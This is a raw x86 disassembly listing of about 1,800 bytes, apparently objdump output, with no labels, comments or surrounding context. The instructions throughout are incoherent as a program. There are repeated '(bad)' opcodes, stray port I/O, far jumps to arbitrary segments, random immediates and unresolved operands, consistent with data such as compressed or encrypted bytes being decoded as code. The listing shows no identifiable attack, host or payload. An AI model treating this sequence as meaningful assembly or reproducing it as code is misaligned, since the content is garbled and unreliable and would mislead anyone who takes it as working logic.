  40851b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40851c:	adc    edi,DWORD PTR [ecx-0x2d]
  40851f:	inc    esi
  408520:	pop    ebx
  408522:	(bad)  
  408523:	enter  0x5e88,0xee
  408527:	add    BYTE PTR [ebx-0x4a],0x94
  40852b:	push   es
  40852c:	pop    ebx
  40852d:	xor    ch,dh
  40852f:	je     0x4085ae
  408531:	mov    ebp,0x8665dd75
  408536:	jo     0x4084dc
  408538:	adc    DWORD PTR [edi],edi
  40853a:	xchg   edx,eax
  40853b:	pop    es
  40853c:	loop   0x408559
  40853e:	jbe    0x408571
  408540:	ds inc ebp
  408542:	out    dx,al
  408543:	add    DWORD PTR [ebx-0x64],ecx
  408546:	pop    ss
  408547:	jg     0x408580
  408549:	jp     0x408566
  40854b:	mov    eax,ds:0xa9eacfd3
  408550:	adc    al,0x8c
  408552:	outs   dx,DWORD PTR ds:[esi]
  408553:	jne    0x4085b3
  408555:	repnz in eax,0x4f
  408558:	adc    bl,dh
  40855a:	fstp   QWORD PTR [eax]
  40855c:	out    dx,al
  40855d:	pop    ebx
  40855e:	test   BYTE PTR [esi+0x7d0e888c],cl
  408564:	cmp    dl,BYTE PTR [ebx+0x1f]
  408567:	pop    eax
  408568:	sti    
  408569:	pusha  
  40856a:	adc    ebp,ebp
  40856c:	test   al,0x3
  40856e:	sbb    BYTE PTR [edi+0x79],ch
  408571:	pusha  
  408572:	sub    eax,0x59a6ef03
  408577:	pop    edx
  408578:	jnp    0x4085b6
  40857a:	out    dx,al
  40857b:	je     0x4085af
  40857d:	and    edi,DWORD PTR [esi-0x25]
  408580:	loop   0x4085d1
  408582:	out    0x30,eax
  408584:	mov    ah,0x60
  408586:	push   es
  408587:	test   BYTE PTR [ecx+0x35],ah
  40858a:	or     ebx,DWORD PTR [eax+0x5]
  40858d:	(bad)  
  40858e:	out    dx,al
  40858f:	mov    WORD PTR [ecx],?
  408591:	adc    al,0x18
  408593:	or     eax,0x9a60b03
  408598:	sbb    eax,0xdae4a345
  40859d:	mov    al,ds:0x7bc81606
  4085a2:	fsubr  st(6),st
  4085a4:	pop    esi
  4085a5:	push   edx
  4085a6:	sub    DWORD PTR [edi-0x5d],0xe4de185f
  4085ad:	pusha  
  4085ae:	clc    
  4085af:	mov    DWORD PTR [ebx],esp
  4085b1:	xor    BYTE PTR [ecx],ch
  4085b3:	hlt    
  4085b4:	ret    
  4085b5:	ret    0x4bee
  4085b8:	ss adc eax,0xdb302df2
  4085be:	stc    
  4085bf:	mov    al,ds:0x978282f5
  4085c4:	or     BYTE PTR [edx],cl
  4085c6:	push   eax
  4085c7:	mov    edi,0x7aee11e9
  4085cc:	xchg   esi,eax
  4085cd:	mov    esi,0x5aabed2d
  4085d2:	sub    BYTE PTR [ecx+0x47c08e68],ah
  4085d8:	js     0x40860f
  4085da:	sub    esi,edi
  4085dc:	pop    ebp
  4085dd:	test   eax,0x9771d502
  4085e2:	pop    ebx
  4085e3:	sub    bh,BYTE PTR [esi]
  4085e5:	dec    edx
  4085e6:	int3   
  4085e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085e8:	std    
  4085e9:	loopne 0x4085ee
  4085eb:	in     al,0x27
  4085ed:	and    ebx,ebx
  4085ef:	loope  0x408609
  4085f1:	jmp    0x4085e1
  4085f3:	dec    eax
  4085f4:	mov    esi,0x4a97ffe8
  4085f9:	aad    0xde
  4085fb:	xchg   edi,eax
  4085fc:	push   ecx
  4085fd:	mov    dl,cl
  4085ff:	xchg   edx,eax
  408600:	adc    esp,DWORD PTR [ecx-0x53]
  408603:	and    bh,0xb6
  408606:	mov    BYTE PTR [eax+0x5b],dl
  408609:	outs   dx,BYTE PTR ds:[esi]
  40860a:	scas   al,BYTE PTR es:[edi]
  40860b:	mov    esp,0x84e2813
  408610:	jo     0x4085e3
  408612:	lahf   
  408613:	mov    eax,ds:0x8b47d323
  408618:	ret    
  408619:	sub    bl,bl
  40861b:	mov    edx,0x1b517a32
  408620:	mov    eax,ds:0xa05e2d64
  408626:	mov    cl,0x9
  408628:	xchg   DWORD PTR ss:[ebx+0x7afdd6a0],edi
  40862f:	pop    esi
  408630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408631:	mov    DWORD PTR [eax],edi
  408633:	in     al,dx
  408634:	pop    esi
  408635:	std    
  408636:	push   edi
  408637:	test   al,0x42
  408639:	push   ss
  40863a:	fucomip st,st(4)
  40863c:	add    cl,dl
  40863e:	or     DWORD PTR [ecx+0x51e508f0],esp
  408644:	cld    
  408645:	data16 fadd DWORD PTR [edi+0x63]
  408649:	and    DWORD PTR [ecx+0x53],eax
  40864c:	(bad)  
  40864d:	loopne 0x40865e
  40864f:	xor    BYTE PTR [esi],dh
  408651:	stc    
  408652:	int    0xa0
  408654:	popa   
  408655:	iret   
  408656:	xor    eax,0x79e45015
  40865b:	xchg   BYTE PTR [esi-0xc],bl
  40865e:	fsub   DWORD PTR [edi]
  408660:	es xor DWORD PTR gs:[edi+0x64b160bf],0xcec5cf80
  40866c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866d:	dec    edi
  40866e:	clc    
  40866f:	sti    
  408670:	(bad)  
  408672:	out    dx,al
  408673:	je     0x40861a
  408675:	cwde   
  408676:	mov    ch,BYTE PTR [edx]
  408678:	aaa    
  408679:	cmp    BYTE PTR gs:[eax+eiz*2],cl
  40867d:	ficom  WORD PTR [edi]
  40867f:	test   eax,0x9cae889d
  408684:	rol    DWORD PTR ds:0xe3f169ee,0x3d
  40868b:	pop    esi
  40868c:	shl    BYTE PTR [ebx],1
  40868e:	mov    bl,0xa0
  408690:	xchg   dh,bh
  408692:	cmp    edi,DWORD PTR [ebx+edi*2+0x5bafa491]
  408699:	lea    ebp,[ebp+0xe719227]
  40869f:	xor    eax,DWORD PTR [eax-0xd]
  4086a2:	es test al,0x55
  4086a5:	pop    edi
  4086a6:	and    al,0xb9
  4086a8:	pushf  
  4086a9:	adc    BYTE PTR [ebp-0x39],bl
  4086ac:	mov    ds:0x3173eeba,al
  4086b1:	xchg   esp,eax
  4086b2:	xchg   edx,eax
  4086b3:	cmp    DWORD PTR [ebx+0x76a17b01],esp
  4086b9:	iret   
  4086ba:	or     eax,0x23c719a
  4086bf:	jg     0x40871f
  4086c1:	sbb    eax,0x5c1e7595
  4086c6:	nop
  4086c7:	jbe    0x40873c
  4086c9:	pop    ebp
  4086ca:	pop    eax
  4086cb:	mov    ds:0xaf08297d,al
  4086d0:	fidivr WORD PTR [ebp-0x20a106df]
  4086d6:	pop    ds
  4086d7:	add    dh,al
  4086d9:	xlat   BYTE PTR ds:[ebx]
  4086da:	shl    edx,0xda
  4086dd:	pusha  
  4086de:	mov    al,0xa2
  4086e0:	jne    0x408754
  4086e2:	jecxz  0x408734
  4086e4:	push   esi
  4086e5:	shl    BYTE PTR [ebx],1
  4086e7:	mov    edx,0xd41a6025
  4086ec:	je     0x408755
  4086ee:	mov    ah,0x5e
  4086f0:	cdq    
  4086f1:	pop    esp
  4086f2:	push   esi
  4086f3:	mov    ebp,DWORD PTR [eax+0x66a3efb0]
  4086f9:	gs cmc 
  4086fb:	or     al,0xdd
  4086fd:	fadd   DWORD PTR [esi-0x11ec2594]
  408703:	adc    dh,BYTE PTR [ebx-0x2e69b1e4]
  408709:	push   ebx
  40870a:	imul   ebp,DWORD PTR [eax-0x6315050e],0x51
  408711:	jno    0x408757
  408713:	cmc    
  408714:	push   edi
  408715:	jecxz  0x4086fe
  408717:	jmp    0x40873e
  408719:	mov    eax,ds:0x61049beb
  40871e:	loopne 0x4086d8
  408720:	cli    
  408721:	jb     0x4086db
  408723:	mov    al,ds:0x129f8f58
  408728:	retf   
  408729:	xor    bl,BYTE PTR [ebx-0x3e]
  40872c:	fld    DWORD PTR fs:[ebp-0x101ccf95]
  408733:	push   0x44998103
  408738:	mov    al,0x3a
  40873a:	pop    ds
  40873b:	lock push ecx
  40873d:	popa   
  40873e:	mov    ch,0x1
  408740:	sahf   
  408741:	rcl    DWORD PTR [edx-0x110c226a],0x82
  408748:	jae    0x4086f9
  40874a:	jno    0x408710
  40874c:	jnp    0x4087a6
  40874e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40874f:	mov    al,ds:0x4e59f1b7
  408754:	mov    eax,0x529e9567
  408759:	xchg   esi,eax
  40875a:	loopne 0x40877a
  40875c:	fwait
  40875d:	aam    0xb
  40875f:	sub    cl,dh
  408761:	mov    DWORD PTR ds:0xdc609898,0x6577647e
  40876b:	and    al,0xa4
  40876d:	cdq    
  40876e:	out    dx,al
  40876f:	inc    ecx
  408770:	push   ecx
  408771:	int    0x97
  408773:	aad    0x15
  408775:	pop    edx
  408776:	dec    ecx
  408777:	mov    eax,ds:0xe2efd959
  40877c:	popa   
  40877d:	lods   eax,DWORD PTR ds:[esi]
  40877e:	cmp    ecx,eax
  408780:	pop    esi
  408781:	(bad)  
  408782:	cs ss push 0x1bfaa912
  408789:	dec    edi
  40878a:	loop   0x408724
  40878c:	pop    esp
  40878d:	push   edx
  40878e:	xchg   esp,eax
  40878f:	imul   edi,DWORD PTR [ecx+0x342102d1],0x68
  408796:	push   ebp
  408797:	or     esi,ebx
  408799:	mov    bl,0xe0
  40879b:	outs   dx,DWORD PTR ds:[esi]
  40879c:	pop    esi
  40879d:	jmp    0x40874e
  40879f:	into   
  4087a0:	pop    esp
  4087a1:	scas   al,BYTE PTR es:[edi]
  4087a2:	ja     0x40877d
  4087a4:	mov    esp,0x7d56c160
  4087a9:	xchg   edi,eax
  4087aa:	das    
  4087ab:	std    
  4087ac:	jns    0x4087ea
  4087ae:	out    dx,al
  4087af:	push   ebx
  4087b0:	inc    edx
  4087b1:	adc    cl,BYTE PTR [ebx+0x40]
  4087b4:	call   0x80e0ef63
  4087b9:	mov    ds:0x2efea90a,al
  4087be:	shl    DWORD PTR [esp+eax*4-0x19],0xee
  4087c3:	push   0xfffffffe
  4087c5:	mov    edi,0xd4290f36
  4087ca:	repz xchg ebx,eax
  4087cc:	pop    es
  4087cd:	and    BYTE PTR [ebx-0x70a08060],bh
  4087d3:	xor    al,0x48
  4087d5:	inc    esp
  4087d6:	in     eax,dx
  4087d7:	aam    0xe0
  4087d9:	mov    ah,0xdd
  4087db:	loop   0x408856
  4087dd:	mov    esi,cs
  4087df:	sbb    eax,0x563860dd
  4087e4:	xchg   ebx,eax
  4087e5:	dec    edx
  4087e6:	aaa    
  4087e7:	loope  0x408796
  4087e9:	repnz out dx,al
  4087eb:	fiadd  WORD PTR [eax+edx*2-0x2]
  4087ef:	enter  0xb3f,0x8d
  4087f3:	mov    eax,ds:0x5ebba7c3
  4087f8:	xchg   esi,eax
  4087f9:	sbb    ch,BYTE PTR [eax-0x1e]
  4087fc:	arpl   di,dx
  4087fe:	cdq    
  4087ff:	div    DWORD PTR [edx+esi*2-0x7]
  408803:	pusha  
  408804:	(bad)  [eax+0xb]
  408807:	hlt    
  408808:	jg     0x40886a
  40880a:	xor    al,0x8d
  40880c:	xchg   edx,eax
  40880d:	sbb    edx,ecx
  40880f:	add    ecx,DWORD PTR [ebx+esi*1-0x12]
  408813:	push   ds
  408814:	mov    bh,0x4b
  408816:	ret    
  408817:	jae    0x408836
  408819:	loop   0x40883b
  40881b:	mov    eax,ds:0xfa6b164b
  408820:	out    dx,eax
  408821:	xor    BYTE PTR ds:0xf067ee4f,dl
  408827:	out    dx,eax
  408828:	sub    al,BYTE PTR [ebx]
  40882a:	adc    al,0x61
  40882c:	test   al,0x69
  40882e:	mov    WORD PTR [ebp+ebx*2-0x21c32398],cs
  408835:	jl     0x408809
  408837:	xchg   esp,eax
  408838:	in     al,0x47
  40883a:	pushf  
  40883b:	loop   0x40889c
  40883d:	mov    gs,WORD PTR [edx]
  40883f:	pop    ebp
  408840:	aaa    
  408841:	push   ecx
  408842:	adc    DWORD PTR [ecx],ebp
  408844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408845:	xor    BYTE PTR [esi],bl
  408847:	mov    eax,ds:0x7408e93e
  40884c:	out    dx,eax
  40884d:	adc    al,0x5
  40884f:	sbb    ebx,DWORD PTR [edi+0x3a]
  408852:	push   0xb489330d
  408857:	adc    BYTE PTR [esi-0x45],cl
  40885a:	leave  
  40885b:	mov    al,ds:0xbffd0e5a
  408860:	mov    al,ds:0x5e00fcc9
  408865:	out    dx,eax
  408866:	mov    dl,0xad
  408868:	(bad)  
  408869:	fcomp  QWORD PTR [eax+0x365a37e1]
  40886f:	sbb    al,0x3a
  408871:	loopne 0x408830
  408873:	inc    ebx
  408874:	lea    eax,[esi+edi*2]
  408877:	push   ebx
  408878:	cwde   
  408879:	xchg   ebx,eax
  40887a:	in     eax,dx
  40887b:	inc    eax
  40887c:	enter  0x6667,0xbb
  408880:	xchg   edi,eax
  408881:	je     0x4088b9
  408883:	das    
  408884:	test   DWORD PTR [eax-0x2a],esp
  408887:	xor    BYTE PTR [ebx-0xd4a43e8],bh
  40888d:	push   0x3c9431ee
  408892:	pop    eax
  408893:	push   esp
  408894:	stos   BYTE PTR es:[edi],al
  408895:	pop    edx
  408896:	pop    ecx
  408897:	mov    eax,ds:0x3beb460f
  40889c:	dec    edi
  40889d:	mov    eax,0xc1f539db
  4088a2:	dec    eax
  4088a3:	bound  ebx,QWORD PTR [esi+0x38]
  4088a6:	aam    0x30
  4088a8:	mov    eax,0x83743d14
  4088ad:	pop    ebp
  4088ae:	cmp    esi,esi
  4088b0:	loop   0x408925
  4088b2:	ds out dx,eax
  4088b4:	scas   al,BYTE PTR es:[edi]
  4088b5:	scas   al,BYTE PTR es:[edi]
  4088b6:	add    cl,0xf8
  4088b9:	xor    al,dh
  4088bb:	js     0x40886e
  4088bd:	jo     0x408873
  4088bf:	loopne 0x40884d
  4088c1:	and    al,0x59
  4088c3:	arpl   WORD PTR [ebp+0x5c],di
  4088c6:	pop    esi
  4088c7:	or     al,0xad
  4088c9:	fstp   QWORD PTR ds:0x6c2fab21
  4088cf:	pop    esp
  4088d0:	pop    edi
  4088d1:	jmp    0x344d:0x240f079a
  4088d8:	popf   
  4088d9:	xchg   DWORD PTR [eax-0x33],esp
  4088dc:	cs adc ebp,ebx
  4088df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e0:	repnz xor BYTE PTR [edi+0x14],dl
  4088e4:	mov    esi,0x7a67b400
  4088e9:	sub    al,0xee
  4088eb:	imul   ebx,DWORD PTR [ebx],0xffffffd4
  4088ee:	lods   al,BYTE PTR ds:[esi]
  4088ef:	(bad)
  4088f2:	xor    eax,0x794819a1
  4088f7:	and    al,0x78
  4088f9:	out    dx,eax
  4088fa:	cmp    bl,BYTE PTR [esi+0x5174325e]
  408900:	rol    BYTE PTR [eax+eiz*4-0x3e],cl
  408904:	lods   al,BYTE PTR ds:[esi]
  408905:	shr    BYTE PTR [ecx],1
  408907:	mov    eax,ds:0x6345bd0a
  40890c:	adc    BYTE PTR [edi+eax*1+0x5a],0x52
  408911:	(bad)  
  408913:	(bad)  
  408914:	fidiv  WORD PTR ds:0xdc9e443f
  40891a:	inc    ecx
  40891b:	mov    ds:0xea57d0cb,al
  408920:	ret    
  408921:	lods   al,BYTE PTR ds:[esi]
  408922:	cmp    DWORD PTR [ebp-0x4011698f],eax
  408928:	adc    dh,BYTE PTR [esi+0x24]
  40892b:	cmp    BYTE PTR [edi-0x6],ch
  40892e:	jmp    0x4088ce
  408930:	fcom   DWORD PTR [ebx+0x5d]
  408933:	push   ebp
  408934:	pop    esi
  408935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408937:	sbb    al,0x59
  408939:	(bad)  
  40893a:	out    dx,al
  40893b:	rcr    BYTE PTR [edx+0xa981f55],0x57
  408942:	dec    esp
  408943:	out    dx,al
  408944:	cmp    edx,DWORD PTR ds:0x535e6f
  40894a:	jmp    0x680b5db1
  40894f:	dec    ecx
  408950:	push   ds
  408951:	xor    bh,ch
  408953:	cmc    
  408954:	pop    esi
  408955:	jns    0x408914
  408957:	pop    edi
  408958:	stc    
  408959:	or     DWORD PTR ds:0xc560ebf7,ebx
  40895f:	out    dx,eax
  408960:	and    al,0xf4
  408962:	and    al,0x20
  408964:	call   0x3f8975d9
  408969:	jmp    0xf1b:0x40ee316e
  408970:	push   esi
  408971:	popa   
  408972:	sti    
  408973:	jno    0x4089df
  408975:	out    0xd7,eax
  408977:	jg     0x408937
  408979:	sti    
  40897a:	jmp    0x408982
  40897c:	bound  ecx,QWORD PTR [esi]
  40897e:	aaa    
  40897f:	(bad)  
  408981:	add    dl,ch
  408983:	cmpxchg BYTE PTR [edi-0x6f],bl
  408987:	mov    esi,0xc547ca39
  40898c:	jecxz  0x40893c
  40898e:	scas   al,BYTE PTR es:[edi]
  40898f:	xor    eax,DWORD PTR [edi-0x297d1124]
  408995:	shl    BYTE PTR [eax-0x56382be4],1
  40899b:	test   al,0x5c
  40899d:	sahf   
  40899e:	jg     0x408a1b
  4089a0:	adc    ah,BYTE PTR [ecx-0x3997fec6]
  4089a6:	mov    dl,BYTE PTR [esi+0x5e]
  4089a9:	mov    ebp,ecx
  4089ab:	test   al,0x1f
  4089ad:	sbb    DWORD PTR [eax+0xd],0xffffffa4
  4089b1:	addr16 jo 0x408a33
  4089b4:	fisub  WORD PTR [ecx]
  4089b6:	mov    ch,0x65
  4089b8:	fcomp  QWORD PTR [ecx+0x345e793d]
  4089be:	jns    0x4089ac
  4089c0:	xor    BYTE PTR [esi-0xf50aa34],dh
  4089c6:	xor    ebp,DWORD PTR [ecx+0x2beef504]
  4089cc:	jg     0x408a03
  4089ce:	sbb    eax,0xec125186
  4089d3:	pop    esp
  4089d4:	je     0x408a34
  4089d6:	mov    ?,WORD PTR [eax-0x3fe05f72]
  4089dc:	adc    BYTE PTR [ecx],al
  4089de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089df:	sub    al,0x7a
  4089e1:	pusha  
  4089e2:	push   ebp
  4089e3:	pop    esi
  4089e4:	in     eax,dx
  4089e5:	clc    
  4089e6:	daa    
  4089e7:	aaa    
  4089e8:	mov    dh,0xd
  4089ea:	out    dx,al
  4089eb:	push   edx
  4089ec:	xor    al,dh
  4089ee:	mov    dl,0x3d
  4089f0:	loope  0x408a5c
  4089f2:	lahf   
  4089f3:	mov    eax,ds:0xd821c5f6
  4089f8:	xchg   edi,eax
  4089f9:	scas   al,BYTE PTR es:[edi]
  4089fa:	(bad)  
  4089fb:	aas    
  4089fc:	push   ecx
  4089fd:	xadd   DWORD PTR [edi-0x3b7db5a2],esi
  408a04:	retf   0x4b5c
  408a07:	mov    eax,ds:0x787109af
  408a0c:	adc    al,0x6d
  408a0e:	or     dh,al
  408a10:	pop    esi
  408a11:	popf   
  408a12:	mov    esi,0x1cd4857d
  408a17:	fwait
  408a18:	cld    
  408a19:	pop    edi
  408a1a:	fs push es
  408a1c:	xchg   edi,eax
  408a1d:	push   edi
  408a1e:	in     al,dx
  408a1f:	mov    edi,0x69069864
  408a24:	sub    al,0x79
  408a26:	add    BYTE PTR [ecx],bl
  408a28:	xchg   DWORD PTR [ecx+0x32ebfd27],eax
  408a2e:	into   
  408a2f:	pop    eax
  408a30:	fcomip st,st(2)
  408a32:	cld    
  408a33:	mov    ecx,ss
  408a35:	cmp    dh,BYTE PTR [ebp+0x64]
  408a38:	mov    al,0x8e
  408a3a:	add    al,0xce
  408a3c:	(bad)  
  408a3e:	fsub   DWORD PTR [edx+0x5e]
  408a41:	shr    DWORD PTR [ebx-0x4a5cbb7a],cl
  408a47:	push   es
  408a48:	dec    edx
  408a49:	push   edx
  408a4a:	cs jmp 0xbaf7020
  408a50:	and    cl,ch
  408a52:	push   ecx
  408a53:	jae    0x408ab3
  408a55:	fld    TBYTE PTR [ecx+0x6d]
  408a58:	mov    edx,0x21efd451
  408a5d:	mov    bh,0x42
  408a5f:	mov    eax,ds:0x4fc34c9c
  408a64:	mov    ds:0x5e1f4c7c,eax
  408a69:	fadd   DWORD PTR [ebx+0x64d3c0a4]
  408a6f:	pop    ebp
  408a70:	shl    DWORD PTR [eax+0x17],cl
  408a73:	frstor [ecx+esi*8]
  408a76:	call   DWORD PTR [edi]
  408a78:	adc    esp,DWORD PTR ds:0xda64e0ed
  408a7e:	or     al,0xe3
  408a80:	mov    bl,0x25
  408a82:	pop    edx
  408a83:	push   edi
  408a84:	jno    0x408ae6
  408a86:	es jns 0x408ae5
  408a89:	cmp    bl,BYTE PTR [eax-0x8abaa49]
  408a8f:	repz xor al,0xaa
  408a92:	out    dx,al
  408a93:	loop   0x408b14
  408a95:	jecxz  0x408a45
  408a97:	mov    bh,0x1f
  408a99:	pop    edx
  408a9a:	add    al,0x6f
  408a9c:	add    edx,DWORD PTR [esi-0x6e60bbfb]
  408aa2:	pop    esi
  408aa3:	and    al,0xb0
  408aa5:	adc    eax,0xe052551f
  408aaa:	es shl edx,0x4e
  408aae:	retf   0x3eb1
  408ab1:	xlat   BYTE PTR ds:[ebx]
  408ab2:	js     0x408a55
  408ab4:	lock and eax,0x800b5e96
  408aba:	inc    esi
  408abb:	ficomp WORD PTR [esi-0x72]
  408abe:	mov    ebp,0x6cac700a
  408ac3:	cli    
  408ac4:	or     al,BYTE PTR [edx-0x4d]
  408ac7:	mov    edi,0x656da0bb
  408acc:	cld    
  408acd:	bound  edi,QWORD PTR [edi-0x5e74a1ea]
  408ad3:	ret    
  408ad4:	test   DWORD PTR [esi],0x61038ecb
  408ada:	popa   
  408adb:	pusha  
  408adc:	and    BYTE PTR [edx+0x409c4bfb],bh
  408ae2:	in     eax,dx
  408ae3:	enter  0x7b18,0x18
  408ae7:	icebp  
  408ae8:	int3   
  408ae9:	pop    ebx
  408aea:	shl    WORD PTR [ecx+0x13342c42],0xd2
  408af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408af3:	ret    0xe53e
  408af6:	dec    edx
  408af7:	ins    BYTE PTR es:[edi],dx
  408af8:	mov    edi,0xdc13ee35
  408afd:	xchg   ebp,eax
  408afe:	jno    0x408b0f
  408b00:	xchg   esp,eax
  408b01:	jbe    0x408a88
  408b03:	mov    ds:0x10d2813a,al
  408b08:	push   ds
  408b09:	mov    ah,0xaf
  408b0b:	dec    ebx
  408b0c:	into   
  408b0d:	in     eax,0xb2
  408b0f:	and    ebx,DWORD PTR [esi+0x53]
  408b12:	adc    eax,0xa6a2692e
  408b17:	inc    edi
  408b18:	mov    edx,0x3072d60
  408b1d:	test   BYTE PTR [edx-0x5a],0x1c
  408b21:	aaa    
  408b22:	add    dh,BYTE PTR [edi-0x4c54da31]
  408b28:	xchg   esi,eax
  408b29:	jne    0x408b02
  408b2b:	sbb    BYTE PTR [eax+0x648ddb02],dh
  408b31:	cld    
  408b32:	pop    edi
  408b33:	mov    eax,ds:0x7f2b936d
  408b38:	sub    eax,0x64c258bf
  408b3d:	(bad)  
  408b3e:	fwait
  408b3f:	push   edx
  408b40:	retf   
  408b41:	pusha  
  408b42:	inc    ebx
  408b43:	jmp    0x408b7a
  408b45:	dec    edi
  408b46:	mov    eax,ss:0xb0be3cde
  408b4c:	xlat   BYTE PTR ds:[ebx]
  408b4d:	cli    
  408b4e:	mov    ch,0x90
  408b50:	pop    ebx
  408b51:	mov    BYTE PTR [ebx],ah
  408b53:	xchg   ebp,eax
  408b54:	loopne 0x408ae9
  408b56:	outs   dx,BYTE PTR ds:[esi]
  408b57:	shr    BYTE PTR [ebx],0x8e
  408b5a:	mov    dh,0xa0
  408b5c:	in     eax,0xe2
  408b5e:	xchg   DWORD PTR [ebp-0x5407cd91],ebx
  408b64:	pop    esi
  408b65:	add    al,ah
  408b67:	shr    DWORD PTR [ebp+0x244b4205],cl
  408b6d:	popa   
  408b6e:	(bad)  
  408b6f:	or     al,0x4a
  408b71:	adc    BYTE PTR [ebx-0x75],ah
  408b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b75:	mov    dh,0x50
  408b77:	adc    DWORD PTR [edi+0x51],ebx
  408b7a:	mov    edi,0x8ab4dda1
  408b7f:	jno    0x408b28
  408b81:	jns    0x408b43
  408b83:	mov    al,ds:0x2b0d2551
  408b88:	jl     0x408c07
  408b8a:	ret    0xd61c
  408b8d:	data16 out dx,al
  408b8f:	adc    bh,BYTE PTR [ecx]
  408b91:	mov    ss,esi
  408b93:	mov    bh,0xda
  408b95:	call   0x2b5f2cad
  408b9a:	xchg   edi,eax
  408b9b:	outs   dx,BYTE PTR ds:[esi]
  408b9c:	aaa    
  408b9d:	test   DWORD PTR [eax+edx*2+0x54cdd05e],0x4d014c72
  408ba8:	sub    BYTE PTR [esi+0x25],bl
  408bab:	sub    DWORD PTR [edx-0x496f45ff],esi
  408bb1:	cwde   
  408bb2:	mov    esp,0x7c705ebd
  408bb7:	cmp    al,0x71
  408bb9:	inc    esi
  408bba:	imul   ecx,DWORD PTR [eax+0x6b],0x60
  408bbe:	cmp    al,0xe4
  408bc0:	je     0x408baf
  408bc2:	inc    edx
  408bc3:	push   esp
  408bc4:	xor    al,0xc4
  408bc6:	out    dx,al
  408bc7:	test   BYTE PTR [edx+0x4e],0x8d
  408bcb:	inc    ecx
  408bcc:	cmp    al,0xe6
  408bce:	clc    
  408bcf:	scas   al,BYTE PTR es:[edi]
  408bd0:	and    esi,DWORD PTR [esi-0x12]
  408bd3:	retf   0x5ce1
  408bd6:	and    cl,ch
  408bd8:	das    
  408bd9:	mov    edx,0xe22ee5ee
  408bde:	push   esp
  408bdf:	fsub   DWORD PTR [edi+0x3da0b168]
  408be5:	int3   
  408be6:	sub    ebp,0xb3747700
  408bec:	pop    esi
  408bed:	xchg   edi,eax
  408bee:	mov    eax,0xce06cf0c
  408bf3:	cmp    BYTE PTR [ecx+0x52],bh
  408bf6:	push   ebx
  408bf7:	call   0xc3b:0x89cf026f
  408bfe:	pop    edi
  408bff:	enter  0xf2,0xa2
  408c03:	dec    ebp
  408c04:	lock jl 0x408bf5
  408c07:	gs ins BYTE PTR es:[edi],dx
  408c09:	jns    0x408bf8
  408c0b:	xor    BYTE PTR [ebp+0x18],0xfc
  408c0f:	mov    al,ds:0xb55791cd
  408c14:	out    dx,al
  408c15:	push   ebp
  408c16:	lods   al,BYTE PTR ds:[esi]
  408c17:	fld    TBYTE PTR [esi+0x4a]
  408c1a:	out    dx,al
  408c1b:	dec    ebx
  408c1c:	jmp    0xf3a51db1
  408c21:	jno    0x408bff
  408c23:	sahf   
  408c24:	call   DWORD PTR [eax]
  408c26:	ror    DWORD PTR [esi+edi*8-0x432d5b1d],0x1a
  408c2e:	out    dx,al
  408c2f:	test   dl,ah
  408c31:	xchg   esi,eax
  408c32:	sbb    al,0x75
  408c34:	inc    edi
  408c35:	dec    ebp
  408c36:	aam    0xa0
  408c38:	and    BYTE PTR [esi],ch
  408c3a:	mov    WORD PTR es:[ebx+0x54],?
  408c3e:	push   eax
  408c3f:	lds    esp,FWORD PTR [edi-0xc]
  408c42:	sbb    ch,0x6e
  408c45:	pusha  
  408c46:	sub    eax,0x68ffe8d0
  408c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4c:	es stos BYTE PTR es:[edi],al
  408c4e:	add    al,0x75
  408c50:	or     edi,edi
  408c52:	outs   dx,DWORD PTR ds:[esi]
  408c53:	sbb    BYTE PTR [edx],dl
  408c55:	or     bl,BYTE PTR [esp+edx*4]
  408c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c59:	(bad)  
  408c5a:	ds jnp 0x408c3d
  408c5d:	adc    eax,0x215e34e5
  408c62:	jmp    0x408c67
  408c64:	out    dx,al
  408c65:	shl    DWORD PTR [esi+0x3160c78a],1
  408c6b:	ror    DWORD PTR [edi+edx*4],0x98
  408c6f:	inc    ebp
  408c70:	xchg   ebp,eax
  408c71:	pop    ecx
  408c72:	push   esi
  408c73:	dec    ebx
  408c74:	push   esp
  408c75:	es call 0x1825:0xee84917b
  408c7d:	mov    edi,0x711578cb
  408c82:	repz fidivr DWORD PTR [eax+0x5e128ceb]
  408c89:	pop    esp
  408c8a:	mov    ecx,0x92e79b13
  408c8f:	adc    esp,edx
  408c91:	daa    
  408c92:	jmp    DWORD PTR [eax+0x44c7cbef]
  408c98:	das    
  408c99:	loop   0x408c58
  408c9b:	dec    eax
  408c9c:	pop    esi
  408c9d:	xor    ebx,edx
  408c9f:	fidiv  DWORD PTR [edx]
  408ca1:	push   0x2b
  408ca3:	int3   
  408ca4:	repz push ecx
  408ca6:	cmp    al,0x17
  408ca8:	fld    DWORD PTR [eax+edi*8+0x59a363a5]
  408caf:	and    DWORD PTR [ecx-0x2c],ecx
  408cb2:	enter  0x35be,0xbf
  408cb6:	push   edx
  408cb7:	ins    DWORD PTR es:[edi],dx
  408cb8:	test   BYTE PTR [esi+0x21],bh
  408cbb:	fimul  DWORD PTR [ecx+0x49fb760]
  408cc1:	pop    ebx
  408cc2:	dec    edx
  408cc3:	jbe    0x408d08
  408cc5:	popa   
  408cc6:	sub    DWORD PTR [ecx-0x3a],edi
  408cc9:	cmp    eax,0xf61c6931
  408cce:	out    dx,al
  408ccf:	push   0xffffffd8
  408cd1:	ss repz jmp 0xc7a2:0xa0b0434e
  408cda:	jmp    0x5e59:0x7f0e608a
  408ce1:	dec    edi
  408ce2:	mov    ecx,0x9c620dc
  408ce7:	inc    ebx
  408ce8:	pushaw 
  408cea:	stc    
  408ceb:	fisubr WORD PTR [ecx+0x42eb7077]
  408cf1:	lods   eax,DWORD PTR ds:[esi]
  408cf2:	rcr    DWORD PTR [edi+0x5e],cl
  408cf5:	pop    edi
  408cf6:	hlt    
  408cf7:	jae    0x408ce2
